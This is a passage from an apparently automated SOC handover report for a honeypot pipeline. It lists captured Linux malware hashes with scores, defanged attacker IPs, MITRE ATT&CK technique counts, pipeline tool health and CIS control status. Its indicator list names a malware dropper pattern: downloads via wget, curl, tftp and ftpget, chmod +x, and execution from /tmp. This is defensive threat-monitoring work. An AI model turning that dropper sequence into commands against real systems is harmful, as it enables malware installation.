| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 42/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `186.235.2[.]221` | BR | Alares Cabo Servicos de Telecomunicacoes S.A. | **100** ⚠️ | 5 |
| `34.156.136[.]59` | BE | Google LLC | **100** ⚠️ | 2 |
| `81.19.216[.]108` | NL | Infrawatch Limited | **100** ⚠️ | 41 |
| `211.169.212[.]206` | KR | DACOM Corp. | **100** ⚠️ | 50 |
| `34.53.246[.]179` | BE | Google LLC | **100** ⚠️ | 0 |
| `65.20.174[.]49` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `112.26.101[.]76` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `61.178.209[.]47` | CN | CHINANET Gansu province network | **100** ⚠️ | 34 |
| `64.72.74[.]162` | US | Zayo Bandwidth | **100** ⚠️ | 50 |
| `45.118.146[.]219` | VN | Long Van Soft Solution JSC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 176 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 158 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 58 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 56 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 56 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 326 cases |
| Tool 34  | Credential Extractor        | ✅ 177 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 103 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (7.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 60 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 158 priority case(s) shown individually · 35 recon entry/entries in table (14 group(s) consolidating 122 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-25T11:15:57Z_
